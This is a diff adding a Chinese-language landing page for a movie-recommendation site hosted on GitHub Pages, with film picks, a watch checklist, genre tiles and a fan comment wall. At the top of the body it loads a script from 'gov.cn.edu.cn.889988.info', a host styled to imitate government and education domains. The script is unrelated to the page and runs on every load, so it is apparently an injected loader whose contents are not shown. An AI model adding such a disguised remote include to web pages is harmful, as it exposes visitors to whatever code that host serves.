@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="俺也去电影网 - 好片一起看，分享每一份观影的快乐。精选片单、观影清单、影迷社区，把好电影推荐给同样爱看的你。">
+<meta name="keywords" content="俺也去电影网,anyequdianyingwang-wap,好片一起看,电影推荐,观影清单,影迷社区,俺也去电影">
+<meta name="author" content="俺也去电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="俺也去电影网 | 好片一起看">
+<meta property="og:description" content="精选片单、观影清单、影迷社区，把好电影推荐给同样爱看的你。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://anyequdianyingwang-wap.github.io">
+<meta property="og:site_name" content="俺也去电影网">
+<link rel="canonical" href="https://anyequdianyingwang-wap.github.io">
+<title>俺也去电影网 | 好片一起看 - anyequdianwang-wap.github.io</title>
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --paper:#fffaf0;
+  --paper2:#fff4e0;
+  --ink:#2b2320;
+  --soft:#6b5d52;
+  --line:#e2d3bd;
+  --orange:#ff7a45;
+  --orange-d:#e85d2a;
+  --yellow:#ffc53d;
+  --green:#73c991;
+  --pink:#ff9cba;
+  --radius:22px;
+  --shadow:0 6px 0 rgba(43,35,32,.12);
+}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.8;overflow-x:hidden;
+}
+/* 纸质纹理底纹 */
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.5;
+  background-image:radial-gradient(rgba(226,211,189,.5) 1px,transparent 1px);
+  background-size:22px 22px;
+}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+.container{max-width:1120px;margin:0 auto;padding:0 20px;}
+.hl{color:var(--orange-d);}
+.hl2{background:linear-gradient(transparent 60%,var(--yellow) 60%);font-weight:900;}
+
+/* ============ 顶部 ============ */
+header.site{
+  position:sticky;top:0;z-index:1000;background:rgba(255,250,240,.96);
+  backdrop-filter:blur(8px);border-bottom:3px solid var(--ink);
+}
+.header-in{display:flex;align-items:center;justify-content:space-between;gap:16px;height:74px;}
+.logo{display:flex;align-items:center;gap:12px;}
+.logo .pin{
+  width:46px;height:46px;border-radius:50%;background:var(--orange);border:3px solid var(--ink);
+  display:grid;place-items:center;font-size:22px;box-shadow:var(--shadow);transform:rotate(-6deg);
+}
+.logo .txt b{font-size:21px;letter-spacing:1px;display:block;line-height:1.1;}
+.logo .txt b em{font-style:normal;color:var(--orange-d);}
+.logo .txt small{font-size:11px;color:var(--soft);letter-spacing:2px;}
+nav.primary{display:flex;align-items:center;gap:6px;}
+nav.primary a{
+  padding:10px 16px;font-size:15px;font-weight:800;letter-spacing:1px;border-radius:14px;transition:.25s;
+}
+nav.primary a:hover{background:var(--ink);color:var(--paper);}
+.btn-go{
+  padding:11px 24px;border:3px solid var(--ink);border-radius:14px;background:var(--yellow);
+  font-weight:900;font-size:15px;letter-spacing:1px;cursor:pointer;box-shadow:var(--shadow);transition:.2s;
+}
+.btn-go:hover{transform:translate(-2px,-2px);box-shadow:5px 8px 0 rgba(43,35,32,.18);}
+.burger{display:none;cursor:pointer;font-size:26px;font-weight:900;}
+
+/* ============ Hero / 手绘票根 ============ */
+.hero{padding:76px 0 60px;text-align:center;}
+.ticket{
+  max-width:640px;margin:0 auto;background:var(--paper2);border:3px solid var(--ink);border-radius:var(--radius);
+  padding:44px 34px;position:relative;box-shadow:8px 10px 0 rgba(43,35,32,.15);transform:rotate(-1deg);
+}
+.ticket::before,.ticket::after{
+  content:"";position:absolute;top:50%;width:34px;height:34px;border-radius:50%;background:var(--paper);
+  border:3px solid var(--ink);transform:translateY(-50%);
+}
+.ticket::before{left:-20px;}
+.ticket::after{right:-20px;}
+.ticket .stamp{
+  position:absolute;top:-16px;right:30px;background:var(--pink);color:var(--ink);font-weight:900;
+  padding:6px 16px;border:3px solid var(--ink);border-radius:12px;transform:rotate(6deg);font-size:13px;
+}
+.hero h1{font-size:clamp(32px,6.5vw,56px);font-weight:900;line-height:1.25;letter-spacing:1px;}
+.hero h1 .wave{display:inline-block;animation:wave 2.4s ease-in-out infinite;}
+@keyframes wave{0%,100%{transform:rotate(0);}25%{transform:rotate(14deg);}50%{transform:rotate(-6deg);}75%{transform:rotate(8deg);}}
+.hero .lead{margin-top:18px;font-size:18px;color:var(--soft);}
+.hero .cta-row{margin-top:32px;display:flex;gap:14px;justify-content:center;flex-wrap:wrap;}
+.btn-main{
+  padding:14px 34px;border:3px solid var(--ink);border-radius:16px;background:var(--orange);color:#fff;
+  font-weight:900;font-size:17px;letter-spacing:1px;box-shadow:var(--shadow);transition:.2s;cursor:pointer;
+}
+.btn-main:hover{transform:translate(-2px,-2px);box-shadow:6px 8px 0 rgba(43,35,32,.2);}
+.btn-sub{
+  padding:14px 34px;border:3px dashed var(--ink);border-radius:16px;background:var(--paper);font-weight:900;font-size:17px;cursor:pointer;transition:.2s;
+}
+.btn-sub:hover{background:var(--yellow);}
+
+/* ============ 栏目通用 ============ */
+section.block{padding:70px 0;}
+.sec-head{display:flex;align-items:flex-end;gap:14px;margin-bottom:34px;flex-wrap:wrap;border-bottom:3px dashed var(--line);padding-bottom:16px;}
+.sec-head .badge{
+  background:var(--ink);color:var(--paper);font-weight:900;font-size:13px;padding:5px 14px;border-radius:10px;letter-spacing:1px;
+}
+.sec-head h2{font-size:clamp(22px,3.4vw,30px);font-weight:900;letter-spacing:1px;}
+.sec-head .sub{margin-left:auto;font-size:14px;color:var(--soft);font-weight:800;}
+
+/* ============ 栏目一：俺们推荐（票根翻转卡） ============ */
+.picks{display:grid;gap:22px;grid-template-columns:repeat(3,1fr);}
+.pick{
+  background:var(--paper2);border:3px solid var(--ink);border-radius:var(--radius);padding:24px;
+  box-shadow:var(--shadow);transition:.3s;position:relative;cursor:pointer;
+}
+.pick:hover{transform:translate(-4px,-6px);box-shadow:8px 12px 0 rgba(43,35,32,.18);}
+.pick .stk{font-size:13px;font-weight:900;color:var(--paper);background:var(--orange-d);display:inline-block;padding:4px 12px;border-radius:8px;margin-bottom:14px;}
+.pick .thumb{
+  height:150px;border-radius:14px;border:3px solid var(--ink);display:grid;place-items:center;font-size:52px;margin-bottom:16px;
+}
+.pick:nth-child(1) .thumb{background:var(--pink);}
+.pick:nth-child(2) .thumb{background:var(--yellow);}
+.pick:nth-child(3) .thumb{background:var(--green);}
+.pick h4{font-size:20px;font-weight:900;margin-bottom:6px;}
+.pick p{font-size:14px;color:var(--soft);}
+.pick .who{margin-top:14px;font-size:13px;font-weight:900;color:var(--orange-d);}
+
+/* ============ 栏目二：观影清单（复选框清单） ============ */
+.checklist{background:var(--paper2);border:3px solid var(--ink);border-radius:var(--radius);padding:30px 34px;box-shadow:var(--shadow);}
+.chk{display:flex;align-items:center;gap:16px;padding:15px 0;border-bottom:2px dashed var(--line);font-size:17px;cursor:pointer;transition:.2s;}
+.chk:last-child{border-bottom:none;}
+.chk .box{
+  width:26px;height:26px;border:3px solid var(--ink);border-radius:7px;flex-shrink:0;background:var(--paper);
+  display:grid;place-items:center;font-size:16px;font-weight:900;color:var(--paper);transition:.2s;
+}
+.chk:hover .box{background:var(--yellow);}
+.chk.done .box{background:var(--green);}
+.chk.done .tx{text-decoration:line-through;color:var(--soft);}
+.chk .tx{flex:1;}
+.chk .tx b{display:block;font-size:17px;}
+.chk .tx small{font-size:13px;color:var(--soft);}
+.chk .min{font-size:13px;font-weight:900;color:var(--orange-d);white-space:nowrap;}
+
+/* ============ 栏目三：类型转盘（不规则色块） ============ */
+.wheel{display:grid;gap:14px;grid-template-columns:repeat(4,1fr);grid-auto-rows:112px;}
+.wb{
+  background:var(--paper2);border:3px solid var(--ink);border-radius:var(--radius);padding:16px;
+  display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;transition:.25s;cursor:pointer;
+}
+.wb:hover{transform:scale(1.05) rotate(-2deg);}
+.wb .e{font-size:30px;display:block;margin-bottom:6px;}
+.wb h4{font-size:15px;font-weight:900;}
+.wb.t1{background:var(--pink);}
+.wb.t2{background:var(--yellow);}
+.wb.t3{background:var(--green);}
+.wb.t4{background:#a8d8ff;}
+.wb.t5{grid-column:span 2;background:var(--orange);color:#fff;flex-direction:row;gap:16px;justify-content:center;}
+.wb.t5 .e{margin-bottom:0;}
+.wb.t6{grid-row:span 2;background:var(--paper);justify-content:center;}
+.wb.t6 .num{font-size:44px;font-weight:900;color:var(--orange-d);line-height:1;}
+.wb.t6 small{font-size:13px;color:var(--soft);}
+
+/* ============ 栏目四：影迷留言（贴纸墙） ============ */
+.wall{display:grid;gap:20px;grid-template-columns:repeat(3,1fr);}
+.note{
+  padding:24px;border-radius:var(--radius);border:3px solid var(--ink);box-shadow:var(--shadow);
+  transition:.3s;position:relative;
+}
+.note:hover{transform:rotate(0) scale(1.03);z-index:2;}
+.note.n1{background:#fff3cd;transform:rotate(-2deg);}
+.note.n2{background:#ffd6e0;transform:rotate(1.5deg);}
+.note.n3{background:#d3f0dd;transform:rotate(-1deg);}
+.note .qt{font-size:34px;line-height:.6;color:var(--orange-d);}
+.note p{font-size:15px;margin:10px 0 16px;font-style:italic;}
+.note .from{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:900;}
+.note .ava{width:34px;height:34px;border-radius:50%;border:2px solid var(--ink);background:var(--paper);display:grid;place-items:center;font-size:15px;}
+
+/* ============ 栏目五：关于（手绘名片） ============ */
+.card-grid{display:grid;gap:24px;grid-template-columns:1.1fr .9fr;align-items:center;}
+.me-card{
+  background:var(--paper2);border:3px solid var(--ink);border-radius:var(--radius);padding:34px;
+  box-shadow:8px 10px 0 rgba(43,35,32,.15);transform:rotate(.6deg);
+}
+.me-card h3{font-size:26px;font-weight:900;margin-bottom:14px;}
+.me-card p{font-size:15.5px;color:var(--soft);margin-bottom:12px;}
+.me-card .hand{margin-top:18px;font-size:16px;font-weight:900;color:var(--orange-d);}
+.signs{display:grid;gap:14px;grid-template-columns:1fr 1fr;}
+.sign{background:var(--paper);border:3px solid var(--ink);border-radius:16px;padding:20px;text-align:center;box-shadow:var(--shadow);transition:.25s;}
+.sign:hover{background:var(--yellow);transform:translateY(-4px);}
+.sign .big{font-size:30px;font-weight:900;color:var(--orange-d);}
+.sign small{font-size:13px;color:var(--soft);font-weight:900;}
+
+/* ============ 页脚 ============ */
+footer{background:var(--ink);color:var(--paper);padding:54px 0 26px;margin-top:44px;}
+.foot-in{max-width:1120px;margin:0 auto;padding:0 20px;}
+.foot-top{display:grid;gap:34px;grid-template-columns:1.7fr 1fr 1fr 1fr;margin-bottom:32px;}
+.foot-top .brand b{font-size:22px;}
+.foot-top .brand b em{font-style:normal;color:var(--yellow);}
+.foot-top .brand p{color:#cbbca8;font-size:14px;margin-top:12px;}
+.foot-col h5{font-size:14px;letter-spacing:1px;margin-bottom:14px;color:var(--yellow);}
+.foot-col a{display:block;color:#cbbca8;font-size:14px;padding:5px 0;transition:.2s;}
+.foot-col a:hover{color:var(--orange);padding-left:6px;}
+.copy{border-top:2px dashed #6b5d52;padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:13px;color:#cbbca8;}
+.tape{
+  text-align:center;margin-bottom:30px;
+}
+.tape span{
+  display:inline-block;background:var(--pink);color:var(--ink);font-weight:900;padding:8px 26px;
+  border:3px solid var(--ink);border-radius:12px;transform:rotate(-2deg);font-size:15px;
+}
+
+/* ============ 响应式 ============ */
+@media(max-width:940px){
+  nav.primary{display:none;position:absolute;top:74px;left:0;right:0;flex-direction:column;background:var(--paper);padding:16px;border-bottom:3px solid var(--ink);}
+  nav.primary.open{display:flex;}
+  nav.primary a{width:100%;text-align:center;}
+  .burger{display:block;}
+  .picks,.wall{grid-template-columns:1fr 1fr;}
+  .wheel{grid-template-columns:repeat(2,1fr);grid-auto-rows:104px;}
+  .wb.t5{grid-column:span 2;}
+  .card-grid{grid-template-columns:1fr;}
+}
+@media(max-width:520px){
+  .hero{padding:50px 0 40px;}
+  section.block{padding:52px 0;}
+  .ticket{padding:34px 22px;}
+  .foot-top{grid-template-columns:1fr 1fr;}
+  .picks,.wall{grid-template-columns:1fr;}
+  .signs{grid-template-columns:1fr 1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== 顶部 ===== -->
+<header class="site">
+  <div class="container header-in">
+    <a href="#" class="logo">
+      <span class="pin">🎟️</span>
+      <span class="txt"><b>俺<em>也去</em>电影网</b><small>好片一起看</small></span>
+    </a>
+    <nav class="primary" id="nav">
+      <a href="#home">首页</a>
+      <a href="#picks">推荐</a>
+      <a href="#list">清单</a>
+      <a href="#type">类型</a>
+      <a href="#wall">留言</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="btn-go" onclick="location.href='#'">走，一起看</button>
+    <span class="burger" onclick="document.getElementById('nav').classList.toggle('open')">≡</span>
+  </div>
+</header>
+
+<!-- ===== Hero / 手绘票根 ===== -->
+<section class="hero" id="home">
+  <div class="container">
+    <div class="ticket">
+      <span class="stamp">入场券 ADMIT ONE</span>
+      <h1>好片，<span class="wave">🍿</span><br><span class="hl2">俺也去</span>看看</h1>
+      <p class="lead">把好电影，推荐给同样爱看的你 —— 精选片单 · 观影清单 · 影迷社区</p>
+      <div class="cta-row">
+        <button class="btn-main" onclick="location.href='#'">🎬 挑一部看</button>
+        <button class="btn-sub" onclick="location.href='#'">📋 建我的清单</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：俺们推荐（票根卡） ===== -->
+<section class="block" id="picks">
+  <div class="container">
+    <div class="sec-head"><span class="badge">01</span><h2>俺们都在看</h2><a href="#" class="sub">更多推荐 ›</a></div>
+    <div class="picks">
+      <div class="pick">
+        <span class="stk">本周最热</span>
+        <div class="thumb">🚀</div>
+        <h4>星际穿越</h4>
+        <p>当时间变成维度，爱是唯一的答案。诺兰写给宇宙的情书。</p>
+        <div class="who">👤 12,486 人已看</div>
+      </div>
+      <div class="pick">
+        <span class="stk">经典重温</span>
+        <div class="thumb">🧸</div>
+        <h4>千与千寻</h4>
+        <p>穿过隧道，是另一个世界的自己。每一帧都值得截图。</p>
+        <div class="who">👤 9,231 人已看</div>
+      </div>
+      <div class="pick">
+        <span class="stk">口碑新片</span>
+        <div class="thumb">🎭</div>
+        <h4>奥本海默</h4>
+        <p>诺兰用胶片重塑了一个改变世界的瞬间，视听与思辨的双重震撼。</p>
+        <div class="who">👤 7,658 人已看</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：观影清单 ===== -->
+<section class="block" id="list" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="badge">02</span><h2>这个周末看啥</h2><a href="#" class="sub">清空清单 ›</a></div>
+    <div class="checklist">
+      <label class="chk done"><span class="box">✓</span><span class="tx"><b>肖申克的救赎</b><small>希望让人自由 · 剧情</small></span><span class="min">142 分钟</span></label>
+      <label class="chk"><span class="box"></span><span class="tx"><b>盗梦空间</b><small>梦里梦外皆虚实 · 科幻悬疑</small></span><span class="min">148 分钟</span></label>
+      <label class="chk"><span class="box"></span><span class="tx"><b>怦然心动</b><small>青春里最甜的那颗糖 · 爱情</small></span><span class="min">90 分钟</span></label>
+      <label class="chk done"><span class="box">✓</span><span class="tx"><b>头脑特工队 2</b><small>情绪原来也有青春期 · 动画</small></span><span class="min">96 分钟</span></label>
+      <label class="chk"><span class="box"></span><span class="tx"><b>飞驰人生 2</b><small>笑着笑着就燃了 · 喜剧运动</small></span><span class="min">121 分钟</span></label>
+      <label class="chk"><span class="box"></span><span class="tx"><b>坠落的审判</b><small>一场婚姻的罗生门 · 悬疑剧情</small></span><span class="min">151 分钟</span></label>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：类型转盘 ===== -->
+<section class="block" id="type" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="badge">03</span><h2>想看什么类型</h2><a href="#" class="sub">全部 12 类 ›</a></div>
+    <div class="wheel">
+      <div class="wb t1"><span class="e">😂</span><h4>喜剧</h4></div>
+      <div class="wb t2"><span class="e">😱</span><h4>悬疑</h4></div>
+      <div class="wb t3"><span class="e">💕</span><h4>爱情</h4></div>
+      <div class="wb t4"><span class="e">🌊</span><h4>治愈</h4></div>
+      <div class="wb t5"><span class="e">🎬</span><h4>动作 / 冒险</h4></div>
+      <div class="wb t6"><span class="num">800+</span><small>影迷收藏片单</small></div>
+      <div class="wb t1"><span class="e">🐉</span><h4>奇幻</h4></div>
+      <div class="wb t3"><span class="e">🚀</span><h4>科幻</h4></div>
+      <div class="wb t4"><span class="e">📜</span><h4>历史</h4></div>
+      <div class="wb t2"><span class="e">🎭</span><h4>文艺</h4></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：影迷留言 ===== -->
+<section class="block" id="wall" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="badge">04</span><h2>影迷留言墙</h2><a href="#" class="sub">写一条 ›</a></div>
+    <div class="wall">
+      <div class="note n1">
+        <span class="qt">"</span>
+        <p>看完星际穿越那晚，我抬头看了很久的星空，突然觉得宇宙也没那么孤独。</p>
+        <div class="from"><span class="ava">🌙</span>小满 · 星空组</div>
+      </div>
+      <div class="note n2">
+        <span class="qt">"</span>
+        <p>每次心情不好的时候，都会把千与千寻翻出来看一遍，像回了一趟老家。</p>
+        <div class="from"><span class="ava">🍃</span>阿乐 · 治愈组</div>
+      </div>
+      <div class="note n3">
+        <span class="qt">"</span>
+        <p>跟朋友一起看飞驰人生 2，笑到缺氧，最后居然一起红了眼眶。</p>
+        <div class="from"><span class="ava">🏁</span>小北 · 周末组</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：关于（手绘名片） ===== -->
+<section class="block" id="about" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="badge">05</span><h2>关于俺也去电影网</h2></div>
+    <div class="card-grid">
+      <div class="me-card">
+        <h3>🎟️ 一张电影票，一份快乐</h3>
+        <p>俺也去电影网是一个属于影迷的小角落。我们相信，好电影值得被更多人看见，也值得被分享给身边的人。</p>
+        <p>这里有精选片单、可勾选的观影清单、类型转盘，还有一面属于大家的留言墙 —— 把好电影，推荐给同样爱看的你。</p>
+        <div class="hand">🙋 俺也去，一起看！</div>
+      </div>
+      <div class="signs">
+        <div class="sign"><div class="big">800+</div><small>精选片单</small></div>
+        <div class="sign"><div class="big">12</div><small>电影类型</small></div>
+        <div class="sign"><div class="big">4.8★</div><small>影迷评分</small></div>
+        <div class="sign"><div class="big">免费</div><small>随时来看</small></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="foot-in">
+    <div class="tape"><span>🎬 一张电影票，一份快乐 · 俺也去，一起看！</span></div>
+    <div class="foot-top">
+      <div class="brand"><b>俺<em>也去</em>电影网</b><p>把好电影，推荐给同样爱看的你。精选片单、观影清单、影迷社区，随时欢迎你一起来。</p></div>
+      <div class="foot-col"><h5>看片</h5><a href="#">精选片单</a><a href="#">口碑新片</a><a href="#">经典重温</a><a href="#">冷门宝藏</a></div>
+      <div class="foot-col"><h5>类型</h5><a href="#">喜剧</a><a href="#">悬疑</a><a href="#">爱情</a><a href="#">治愈</a></div>
+      <div class="foot-col"><h5>关于</h5><a href="#about">网站介绍</a><a href="#">影迷留言</a><a href="#">投稿合作</a><a href="#">帮助中心</a></div>
+    </div>
+    <div class="copy">
+      <span>© 2026 俺也去电影网（anyequdianyingwang-wap.github.io）· 好片一起看</span>
+      <span>网址：anyequdianyingwang-wap.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+// 复选框清单交互
+document.querySelectorAll('.chk').forEach(function(chk){
+  chk.addEventListener('click',function(){
+    var box=chk.querySelector('.box');
+    chk.classList.toggle('done');
+    box.textContent=chk.classList.contains('done')?'✓':'';
+  });
+});
+</script>
+</body>
+</html>
